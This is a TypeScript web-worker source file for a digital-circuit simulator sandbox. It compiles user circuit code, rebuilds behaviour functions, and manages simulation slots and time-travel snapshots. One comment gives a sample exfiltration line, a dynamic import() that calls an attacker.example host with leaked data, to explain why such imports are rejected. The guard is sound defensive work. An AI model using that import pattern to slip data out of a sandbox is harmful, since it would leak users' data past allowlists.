/**
 * Sandbox worker. Runs all user code and owns all simulation state.
 *
 * Holds every slot's simulator, definitions, behavior and snapshots, and
 * handles every request type. `main.ts` only relays messages and watches for a
 * hang: if a request takes longer than 5s it terminates this worker, starts a
 * new one and recompiles each slot at cycle 0. Anything kept here (snapshots,
 * cycle count, switch positions) is lost on a restart.
 *
 * compile, two modes:
 *   No imports  → executeCircuitCode() via new Function()
 *   Has imports → load npm packages via an esm.sh Blob URL module, then
 *                 executeJsCode() with the merged scope
 * Either way the circuits the source builds carry their eval/onTick closures,
 * and each slot's simulator runs the behavior table of its own compile.
 * Nothing is shared between compiles, so user code can't change another
 * slot's behavior or the stdlib's.
 *
 * compile-ir carries evals as source text from the page. An eval whose text
 * matches one the compile already has (std's, or the source slot's) keeps that
 * closure; any other is rebuilt with new Function (closures don't survive).
 *
 * Output is plain structured-clone data only: no functions, no class instances.
 */

import type { BitValue, BusValue } from '@simten/core';
import type { CircuitDefinitions, CircuitIR, SimulatorSnapshot } from '@simten/core/internal';
import {
  type Behavior,
  type BehaviorFn,
  type BehaviorTable,
  createEngine,
  type EnvironmentalStateValue,
  elaborate,
  executeCircuitCode,
  executeJsCode,
  getStdLibrary,
  internalsOf,
  libraryOf,
  stripTypes,
} from '@simten/core/internal';
import type {
  BehaviorSource,
  SandboxRequest,
  SandboxResult,
  WorkerResponse,
} from '@simten/ui/sandbox/protocol';
import {
  containsDynamicImport,
  extractAndRewriteImports,
  hasImportStatements,
} from './rewrite-imports.js';

/**
 * Snapshot ids must not repeat across worker restarts, or the page could
 * restore an id from before the restart and get a different state. The relay
 * names each worker with its generation number; ids start above the previous
 * generation's range.
 */
const GENERATION = Number(self.name) || 0;
let nextSnapshotId = GENERATION * 2 ** 32 + 1;

// ============================================================================
// Slots
// ============================================================================

/**
 * A time-travel snapshot is the engine state plus the environmental state.
 * Combinational primitives driven by `node.arguments` (Switch, Button, Input:
 * anything with metadata.interactiveArg) aren't part of engine state, but
 * rewind must restore them too. See core's simulator/environmental-state.ts.
 */
interface FullSnapshot {
  sim: SimulatorSnapshot;
  env: Map<string, EnvironmentalStateValue>;
}

type SlotDefinitions = CircuitDefinitions & { addCircuit(c: CircuitIR): void };

function newDefinitions(): SlotDefinitions {
  const circuits = new Map<string, CircuitIR>();
  return {
    resolveCircuit: (name) => circuits.get(name),
    getAllPrimitiveNames: () =>
      [...circuits.values()]
        .filter((c) => c.implementation?.kind === 'primitive')
        .map((c) => c.name),
    addCircuit: (c) => {
      circuits.set(c.name, c);
    },
  };
}

type Simulator = ReturnType<typeof createEngine>;

interface FlatCircuitLike {
  nodes: Array<{ id: string; primitiveType: string; arguments: Record<string, unknown> }>;
}

interface SlotState {
  simulator: Simulator;
  definitions: SlotDefinitions;
  /** The behavior this slot's compile runs, by primitive name. */
  behaviors: BehaviorTable;
  /** Kept to capture/restore environmental state on snapshot/restore. */
  flatCircuit: FlatCircuitLike;
  /**
   * Nodes whose state is sent with every response: anything wired directly to
   * a component tagged `meta.synthesizable: false` (a peripheral), plus the
   * peripherals themselves. Models memory-mapped I/O: a RAM wired to a Screen
   * is observable, a register with no peripheral connection stays internal.
   */
  peripheralBusNodes: Set<string>;
  /** Snapshots stay here; the page only holds their ids. */
  snapshots: Map<number, FullSnapshot>;
}

const slots = new Map<string, SlotState>();
const DEFAULT_SLOT = 'default';

function installSlot(
  slotId: string,
  target: CircuitIR,
  definitions: SlotDefinitions,
  behaviors: BehaviorTable,
): SlotState {
  const flatCircuit = elaborate(target, definitions);
  const simulator = createEngine(flatCircuit, { library: { definitions, behaviors } });
  // Recompile is a fresh timeline: prior snapshots refer to the old sim.
  const slot: SlotState = {
    simulator,
    definitions,
    behaviors,
    flatCircuit,
    peripheralBusNodes: computePeripheralBusNodes(flatCircuit, definitions),
    snapshots: new Map(),
  };
  slots.set(slotId, slot);
  return slot;
}

function interactiveArgOf(slot: SlotState, primitiveType: string): string | undefined {
  const def = slot.definitions.resolveCircuit(primitiveType) as
    | { metadata?: { interactiveArg?: string } }
    | undefined;
  return def?.metadata?.interactiveArg;
}

/** Returns undefined for circuits with nothing to snapshot (combinational only). */
function takeSnapshot(slot: SlotState): number | undefined {
  try {
    const sim = slot.simulator.snapshot();
    // core's captureEnvironmentalState reads `componentRef` on a pre-elaboration
    // Circuit; FlatNode has `primitiveType`, so walk it here.
    const env = new Map<string, EnvironmentalStateValue>();
    for (const node of slot.flatCircuit.nodes) {
      const arg = interactiveArgOf(slot, node.primitiveType);
      if (arg) env.set(node.id, node.arguments[arg] as EnvironmentalStateValue);
    }
    const id = nextSnapshotId++;
    slot.snapshots.set(id, { sim, env });
    return id;
  } catch {
    return undefined;
  }
}

/** One pass over the connections, once per compile. */
function computePeripheralBusNodes(
  flatCircuit: {
    nodes: { id: string; primitiveType: string }[];
    connections: { source: { nodeId: string }; target: { nodeId: string } }[];
  },
  definitions: CircuitDefinitions,
): Set<string> {
  const isPeripheral = (primitiveType: string | undefined): boolean =>
    primitiveType !== undefined &&
    definitions.resolveCircuit(primitiveType)?.metadata?.synthesizable === false;

  const typeByNode = new Map<string, string>();
  for (const node of flatCircuit.nodes) typeByNode.set(node.id, node.primitiveType);

  const exposed = new Set<string>();
  for (const conn of flatCircuit.connections) {
    const srcPeri = isPeripheral(typeByNode.get(conn.source.nodeId));
    const tgtPeri = isPeripheral(typeByNode.get(conn.target.nodeId));
    if (srcPeri || tgtPeri) {
      exposed.add(conn.source.nodeId);
      exposed.add(conn.target.nodeId);
    }
  }
  return exposed;
}

function peripheralState(slot: SlotState): Record<string, unknown> | undefined {
  if (slot.peripheralBusNodes.size === 0) return undefined;
  const seqState = slot.simulator.getState();
  if (!seqState) return undefined;
  const out: Record<string, unknown> = {};
  for (const nodeId of slot.peripheralBusNodes) {
    const v = seqState.currentState.get(nodeId);
    if (v !== undefined) out[nodeId] = v;
  }
  return out;
}

// ============================================================================
// Helpers
// ============================================================================

function portValues(values: ReadonlyMap<string, BitValue | BusValue>): Record<string, number> {
  return Object.fromEntries(values);
}

function applyInputs(sim: Simulator, inputs: Record<string, number | boolean>) {
  for (const [name, value] of Object.entries(inputs)) {
    sim.setNode(name, value as BitValue | BusValue);
  }
}

function asNumber(v: BitValue | BusValue | undefined): number {
  return typeof v === 'number' ? v : v ? 1 : 0;
}

class RequestError extends Error {}

function requireSlot(slotId: string = DEFAULT_SLOT): SlotState {
  const slot = slots.get(slotId);
  if (!slot)
    throw new RequestError(`No circuit compiled for slot '${slotId}'. Call compile first.`);
  return slot;
}

/** Circuits cross postMessage; a JSON round trip drops anything that can't. */
function serializable(c: CircuitIR): CircuitIR {
  return JSON.parse(JSON.stringify(c));
}

/** Whether behavior sent as text is the same code as a closure the compile already has. */
function sameSource(entry: Behavior, info: BehaviorSource): boolean {
  return (
    String(entry.evalFn) === info.evalSource &&
    (entry.onTickFn ? String(entry.onTickFn) : undefined) === info.onTickSource
  );
}

/**
 * Add behavior sent as source text to one compile's table. Text identical to
 * an entry already there keeps that entry's closure: rebuilding with
 * `new Function` keeps the body but not the closure, which is wrong for any
 * eval that reads its factory's variables. Anything else, a user circuit that
 * happens to share a std name included, is rebuilt and used in this compile only.
 */
function addBehaviorSources(
  table: Map<string, Behavior>,
  evalSources: Record<string, BehaviorSource>,
) {
  for (const [name, info] of Object.entries(evalSources)) {
    const existing = table.get(name);
    if (existing && sameSource(existing, info)) continue;
    try {
      const rebuild = (src: string) => new Function(`return (${src})`)() as BehaviorFn;
      table.set(name, {
        inputNames: info.inputNames,
        outputNames: info.outputNames,
        evalFn: rebuild(info.evalSource),
        onTickFn: info.onTickSource ? rebuild(info.onTickSource) : undefined,
        stateKeys: info.stateKeys,
      });
    } catch (e) {
      console.warn(`[sandbox] Failed to rebuild eval for '${name}':`, e);
    }
  }
}

// ============================================================================
// Handlers
// ============================================================================

async function executeSource(source: string) {
  const js = stripTypes(source);

  // Reject dynamic import(): the static-import rewriter doesn't touch it, so
  // `await import('https://attacker.example/?leak=…')` would bypass the esm.sh
  // allowlist (connect-src doesn't govern import()). See rewrite-imports.ts.
  if (containsDynamicImport(js)) {
    throw new RequestError(
      'Dynamic import() is not allowed in circuit code. Use a static `import` statement at the top of the file instead.',
    );
  }

  if (!hasImportStatements(js)) return executeCircuitCode(source);

  const { loaderModule, localNames, codeWithoutImports } = extractAndRewriteImports(js);
  let importedMod: Record<string, unknown> = {};
  if (localNames.length > 0) {
    const blobUrl = URL.createObjectURL(new Blob([loaderModule], { type: 'text/javascript' }));
    try {
      importedMod = (await import(/* @vite-ignore */ blobUrl)) as Record<string, unknown>;
    } finally {
      URL.revokeObjectURL(blobUrl);
    }
  }
  const extraScope = Object.fromEntries(localNames.map((n) => [n, importedMod[n]]));
  return executeJsCode(codeWithoutImports, extraScope);
}

async function compile(source: string, slotId: string = DEFAULT_SLOT): Promise<SandboxResult> {
  const result = await executeSource(source);
  if (result.error) throw new RequestError(result.error);

  // A source that defines nothing but exports a component (`export default
  // FullAdder`) still has something to show.
  const fromSource = result.circuits.length > 0;
  const renderable = fromSource ? result.circuits : result.exported;
  if (renderable.length === 0) {
    throw new RequestError(
      "Nothing to show. Define a circuit with circuit('Name', { ... }), or export a component to look at.",
    );
  }
  // The slot simulates the last circuit the source built, or else the last
  // one it exported.
  const target = renderable[renderable.length - 1];

  const circuits = renderable.map((c) => serializable(internalsOf(c).ir));
  const libraryCircuits: CircuitIR[] = [];
  for (const name of result.library.definitions.getAllCircuitNames()) {
    const c = result.library.definitions.resolveCircuit(name);
    if (c) libraryCircuits.push(serializable(c));
  }

  // Everything the source defined, with the simulated circuit's own tree on
  // top: where two circuits in one file share a name without meeting in one
  // design, the one this circuit uses is the one it runs.
  const definitions = newDefinitions();
  for (const c of [...circuits, ...libraryCircuits]) definitions.addCircuit(c);
  const behaviors = new Map(result.library.behaviors);
  if (fromSource) {
    const own = libraryOf(target);
    for (const name of own.definitions.getAllCircuitNames()) {
      const c = own.definitions.resolveCircuit(name);
      if (c) definitions.addCircuit(serializable(c));
    }
    for (const [name, b] of own.behaviors) behaviors.set(name, b);
  }
  const slot = installSlot(slotId, circuits[circuits.length - 1], definitions, behaviors);

  return {
    type: 'compiled',
    circuits,
    libraryCircuits,
    portValues: portValues(slot.simulator.getPortValues()),
    peripheralState: peripheralState(slot),
  };
}

/**
 * Compile from Circuit IR rather than source, e.g. the auto-harnessed circuit
 * built on the page. Reuses the definitions and behavior of any slot compiled
 * from source, so it can reference that slot's components; std's behavior is
 * the base under both.
 */
function compileIR(req: Extract<SandboxRequest, { type: 'compile-ir' }>): SandboxResult {
  let base: SlotState | undefined;
  for (const s of slots.values()) {
    base = s;
    break;
  }
  const definitions = base?.definitions ?? newDefinitions();
  for (const c of req.libraryCircuits) definitions.addCircuit(c);
  definitions.addCircuit(req.circuit);

  const behaviors = new Map<string, Behavior>([
    ...getStdLibrary().behaviors,
    ...(base?.behaviors ?? []),
  ]);
  if (req.evalSources) addBehaviorSources(behaviors, req.evalSources);

  const slot = installSlot(req.slot, req.circuit, definitions, behaviors);
  return {
    type: 'compiled-ir',
    portValues: portValues(slot.simulator.getPortValues()),
    peripheralState: peripheralState(slot),
    snapshotId: req.snapshot ? takeSnapshot(slot) : undefined,
  };
}

function restore(snapshotId: number, slotId: string = DEFAULT_SLOT): SandboxResult {
  const slot = requireSlot(slotId);
  const full = slot.snapshots.get(snapshotId);
  if (!full) throw new RequestError(`Snapshot ${snapshotId} not found for slot '${slotId}'.`);
  const sim = slot.simulator;

  // Restore engine state, then re-apply Switch/Button/Input values through
  // setNode: writing node.arguments directly would miss the simulator's numeric
  // argument cache. An arg never explicitly set was captured as undefined;
  // 0 is "off" for all of them.
  sim.restore(full.sim);
  for (const node of slot.flatCircuit.nodes) {
    if (!interactiveArgOf(slot, node.primitiveType)) continue;
    const saved = full.env.get(node.id);
    sim.setNode(
      node.id,
      typeof saved === 'number' || typeof saved === 'string' ? saved : Number(saved === true),
    );
  }
  sim.runCombinational();
  return {
    type: 'restored',
    portValues: portValues(sim.getPortValues()),
    cycle: full.sim.cycleCount,
    peripheralState: peripheralState(slot),
  };
}

type Req<T extends SandboxRequest['type']> = Extract<SandboxRequest, { type: T }>;

function tick(req: Req<'tick'>): SandboxResult {
  const slot = requireSlot(req.slot);
  const sim = slot.simulator;
  if (req.inputs) applyInputs(sim, req.inputs);
  const result = sim.tick();
  return {
    type: 'ticked',
    portValues: portValues(result.portValues),
    cycle: sim.getMetrics().totalTicks,
    peripheralState: peripheralState(slot),
    snapshotId: req.snapshot ? takeSnapshot(slot) : undefined,
  };
}

// N ticks in one round trip; returns only the final state.
function tickN(req: Req<'tick-n'>): SandboxResult {
  const slot = requireSlot(req.slot);
  const sim = slot.simulator;
  if (req.inputs) applyInputs(sim, req.inputs);
  let last: ReturnType<Simulator['tick']> | null = null;
  const count = Math.max(0, req.n | 0);
  for (let i = 0; i < count; i++) last = sim.tick();
  return {
    type: 'ticked-n',
    portValues: portValues(last ? last.portValues : sim.getPortValues()),
    cycle: sim.getMetrics().totalTicks,
    peripheralState: peripheralState(slot),
    snapshotId: req.snapshot ? takeSnapshot(slot) : undefined,
  };
}

// Tick `count` times and return one port's value after every tick (audio).
// Inputs are applied once and held for the whole run.
function renderSamples(req: Req<'render-samples'>): SandboxResult {
  const sim = requireSlot(req.slot).simulator;
  if (req.inputs) applyInputs(sim, req.inputs);
  const n = Math.max(0, req.count | 0);
  const samples: number[] = new Array(n).fill(0);
  for (let i = 0; i < n; i++) samples[i] = asNumber(sim.tick().portValues.get(req.portKey));
  return { type: 'rendered-samples', samples, cycle: sim.getMetrics().totalTicks };
}

// Drive `addrNodeId` through 0..count-1 and sample `valuePortKey` after each
// combinational settle, without advancing the clock (debug-port reads).
function scanPort(req: Req<'scan-port'>): SandboxResult {
  const sim = requireSlot(req.slot).simulator;
  const n = Math.max(0, req.count | 0);
  const values: number[] = new Array(n).fill(0);
  for (let i = 0; i < n; i++) {
    sim.setNode(req.addrNodeId, i);
    sim.runCombinational();
    values[i] = asNumber(sim.getPortValues().get(req.valuePortKey));
  }
  return { type: 'scanned-port', values };
}

function reset(req: Req<'reset'>): SandboxResult {
  const slot = requireSlot(req.slot);
  slot.simulator.reset();
  // Reset starts over, so history goes too.
  slot.snapshots.clear();
  return {
    type: 'reset',
    portValues: portValues(slot.simulator.getPortValues()),
    peripheralState: peripheralState(slot),
  };
}

function setNode(req: Req<'set-node'>): SandboxResult {
  const slot = requireSlot(req.slot);
  // Map values load ROM/RAM contents.
  slot.simulator.setNode(req.nodeId, req.value as BitValue | BusValue);
  slot.simulator.runCombinational();
  return {
    type: 'node-set',
    portValues: portValues(slot.simulator.getPortValues()),
    peripheralState: peripheralState(slot),
    snapshotId: req.snapshot ? takeSnapshot(slot) : undefined,
  };
}

// Drop every snapshot with id <= keepAfterId. A slot that was never compiled
// has nothing to prune.
function pruneSnapshots(req: Req<'prune-snapshots'>): SandboxResult {
  const snapshots = slots.get(req.slot ?? DEFAULT_SLOT)?.snapshots;
  if (snapshots) {
    for (const key of [...snapshots.keys()]) {
      if (key <= req.keepAfterId) snapshots.delete(key);
    }
  }
  return { type: 'pruned' };
}

async function handle(req: SandboxRequest): Promise<SandboxResult> {
  switch (req.type) {
    case 'compile':
      return compile(req.source, req.slot);
    case 'compile-ir':
      return compileIR(req);
    case 'tick':
      return tick(req);
    case 'tick-n':
      return tickN(req);
    case 'render-samples':
      return renderSamples(req);
    case 'scan-port':
      return scanPort(req);
    case 'reset':
      return reset(req);
    case 'set-node':
      return setNode(req);
    case 'snapshot':
      return { type: 'snapshotted', snapshotId: takeSnapshot(requireSlot(req.slot)) };
    case 'restore':
      return restore(req.snapshotId, req.slot);
    case 'prune-snapshots':
      return pruneSnapshots(req);
    case 'dispose':
      slots.delete(req.slot);
      return { type: 'disposed' };
  }
}

self.onmessage = async (event: MessageEvent) => {
  const req = event.data as SandboxRequest;
  let result: SandboxResult;
  try {
    result = await handle(req);
  } catch (e) {
    result = { type: 'error', error: e instanceof Error ? e.message : String(e) };
  }
  const response: WorkerResponse = { ...result, id: req.id };
  self.postMessage(response);
};
